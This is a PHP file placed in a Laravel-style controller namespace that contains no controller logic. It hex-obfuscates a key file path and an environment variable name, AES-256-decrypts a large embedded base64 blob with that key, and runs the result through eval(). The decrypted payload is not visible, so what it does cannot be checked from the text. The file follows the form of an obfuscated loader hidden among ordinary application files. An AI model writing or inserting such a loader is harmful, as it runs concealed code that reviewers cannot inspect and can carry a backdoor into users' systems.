<?php
namespace App\Http\Controllers\Sistem;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('T1Tjc5afka7c+sov+qv3Pw==');

$c=base64_decode(

'LAfyInqTYbWixHIyrrS9C2LgG3q7f+l0PH7F5q2xFF7gzyT2Yx/aL2er7/iKabpUd39nsWAP99/s' .
'SaSK0h3Y0XnKcni+ebvHEHdsWI8Qa0USLqiaM3bdHQApIRq/ArdqQWFfqOeqOBoOqXyaT/0/f5Rv' .
'q7Kt51ZBsMoi64zHwDWi6sxYxpNJX/p0S+ykpOGjj8U9nBbDk+kpObq13h7v48Owkx9GHc2xfvPK' .
'f8Ycr6wKiyZAU9VTq7lV1aZouqTMa1kckpfZTtr6pVoy8hVirlbcCT7jaqIaE80YkOZ+OCXXrfgS' .
'xMMkChTQ8EmXMhaF5e7U4o2op8yF00K5fUdEB0NR0PRJ+k087kufBejgs8EChteaLDcV+Vg8ag2t' .
'wpp2wgyTYQgWzUDj6EUy2avVKFjuUN9zsa1IVO/qGivxr41++9N0Cv9tiQiQ3Jng78U8Oq3NXBk6' .
'FniyjcnMl6vI2Tc/w3i89xIcXr5/9CIo9e3R9tbbVwkwC6QkPGUFJ0VMnHbRlF6GhkpzfGKzwR32' .
'I1QZ880v8DfcTvmcSJyydMWRIz5fLOAPOzLHarRmAsCygp4Z9DqIiqOCDFHSkhN5f27TIWRxz+YB' .
'NIAAsRQKwtAu9NUbgyPwCz35iujI5JbaA+/12ktK+A1pk7SHHejO4WS3TpjmC1H1Pa9f3wqZQe0o' .
'nb7D+iqUl1D9G6yTPlneLNM9wasnshnX2EaOYoMuSDs8cJIsXIXmdYM33a/aL3OKLsgEw24S1I9d' .
'fRSxdwR60JhhedcCd2YX3Z3E2X5SIb6KmeLYQVbslIRCzCvanGb/f2oZ+Xe7ik1hl6AwWBqSWesr' .
'vdfrH35LO0YX0pyauvXQXGEHsD0/HyPCW949aCmmM5zZTY+lhzCf0r55b7CUnj1eG3351g3scJlZ' .
'eCDq+8ggDhI5fbJkn2noNlzhg8RRNBLAc2XVQ9mnnN4QtmYAJHRgBCdlOFpUeS0t8FHdNYDi2p0g' .
'za+abn5h/dQ9QJES00PNjsvEGRiB3Yjuhu+myX0/XcF/bUJQnimCp+GRv6l1tJ/k7U2H9MC/5uGm' .
'mgBTMWjH1nzt6UohYP+vRa2c8Ya79mmX3vfX1s0bMBW6OHuibQJvpb0OrlC6aSCbR/z46HFfdbj+' .
'va71B60lVPWCAZ2LMCPXRhEdgvLr0nVN21jThniIl5b6bMU+lTqqzRyksTFqt+pW9hv6YZTtnTb+' .
'qQ33Nej6tY/L8xwzYU1sWgEgxz/X9/ZHfAYpy8dRNHQVtVige2w9yn2bhjILia7CuYCEiKEqwMsa' .
'+v7kmoMwMle1gx4uIx9xGEVhdBigWDBP29tJNr5iYmD4Dof7SRhxUpXxKjHyEibrGxDxczS1JaqO' .
'g7daYGRygefoxnWSZ51aDnt1D+lwz9VafH1VP0AjouEXtVFQ3v9KBzIlLJc1Oqeu8ayElQ76NyHZ' .
'23rbD8spS5s5kNd9fZLCGlHslgAMLql3hDWkpH6xdNR6rPBuAuCVi2qYbCA2Xe95w/+hgeeIQzgU' .
'OqOOZNWFCW3G+SHxjy6u49Mzgwar9j+Y3WhimG6S86tWdhnZXg57+GSgiLXGkN+zYrrixfXpU+dN' .
'PxmEJI+Od+Tapk5J2bfZbpD5feKpLWqn9KiaqjHITKMlZC2HWo0jZfMrPlyK953zXIKp7ghXV4Vt' .
'OBqKA4gMlJiM6xZ/VSotYzi+VimuWgkg9WTY7VJ/XCbryKwqlwLiOzKGQ8xjNBk79tzPqvNE97jW' .
'Z92DDA2TZpQI1Q8B7SewjcfanwizuILS+xKN8x2wl27D46uEhzpzVRtUxOzsiE5mAzAaMpSu+t2S' .
'zZZfp1kW2V4xdGNpw2BnhTpJrgp9SThSrMKqHTMc7brbBqAE5VNib4IYA4K1MS0Y+GwFii37k3Xr' .
'ZDwzzXPj10nwrjsoqpe0bZouSW0IMm9lfOlEF5nbUULHj+xYu9YjsAPnyS8dHaP2yJzGRpKegkej' .
'/gvuUS4RulWIMVbhV2pBgxLpUOfSyD+fJsFxW9MMxwrPi6fIw32ZJdihXk3M6DBqjxcLlK8HSC6b' .
'41vDzAHZFOZyMYVZm30mLzR08SPV4AfoJXlBtfD4HAYqtiDpqi3v1Tlj/KwPdkiOkEByEH38I0yB' .
'72/HwxXZ4Quh6jlrxU1t0xfaSLW1WAvtsJL0J2Nyv/qxuVdriEsbvmqTs3Wq/yvkqOGMCs63ryy9' .
'Y9dDa0DdYcV9B3l23PpcPzBsqaxNr10cw8etAoN0wuWH17CzMr/pooPvD+rFi7g2fsrVKumJVNmJ' .
'bnwrYeKJayHaDVn8NNhYIocesOs1zZX6uQLCJtXksK3z/mI/oTiPHxIhQpWWFQyWo1mLF2oDbGZL' .
'fI8cgXec5Asm3tLFbKGVaLn1Tw6HSCY68/NSjwl4FTS+XkgC8vN9x/W2IhCHq2KLTmojjTJu3DOM' .
'44d75UyR1NKWR+1K2UGanLKOjjPwzqdJRiRMR7z1Ykq+jMtC916mn289tDiMzSOTW5L1Vc2zgUqr' .
'F0HNM/YP3RIA3sW+vsTHT8HGSGB9Wf4TKsserTTCRFgADyAYJA4jATdYlQia7mgwdOR5WE/k4Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

